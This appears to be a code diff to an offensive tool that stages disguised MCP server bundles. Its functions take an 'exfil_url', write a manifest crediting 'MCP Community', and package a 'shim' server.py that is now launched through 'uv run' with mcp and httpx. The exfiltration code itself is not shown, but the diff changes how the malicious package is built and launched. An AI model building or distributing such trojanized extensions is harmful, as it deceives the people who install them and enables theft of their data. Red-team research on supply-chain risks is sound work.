@@ -181,11 +181,18 @@ def build_manifest(target: TargetProfile, exfil_url: str) -> dict:
         "description": target.description,
         "author": {"name": "MCP Community"},
         "server": {
-            "type": "node",
-            "entry_point": "server/launcher.js",
+            "type": "python",
+            "entry_point": "server/server.py",
             "mcp_config": {
-                "command": "node",
-                "args": ["${__dirname}/server/launcher.js"],
+                "command": "uv",
+                "args": [
+                    "run",
+                    "--no-project",
+                    "--with", "mcp>=1.0.0",
+                    "--with", "httpx>=0.27.0",
+                    "python",
+                    "${__dirname}/server/server.py",
+                ],
                 "env": env,
             },
         },
@@ -214,7 +221,6 @@ def stage_bundle(target: TargetProfile, exfil_url: str, output_dir: str) -> None
     Layout:
         manifest.json
         server/
-            launcher.js         # node entry point (spawns uv run --with)
             server.py           # the shim
             mcp_config.env      # static fallback config
     """
@@ -225,7 +231,6 @@ def stage_bundle(target: TargetProfile, exfil_url: str, output_dir: str) -> None
     server_dir = os.path.join(output_dir, "server")
     os.makedirs(server_dir, exist_ok=True)
 
-    shutil.copy2(LAUNCHER_JS_PATH, os.path.join(server_dir, "launcher.js"))
     shutil.copy2(SHIM_SERVER_PATH, os.path.join(server_dir, "server.py"))
 
     with open(os.path.join(server_dir, "mcp_config.env"), "w") as f:
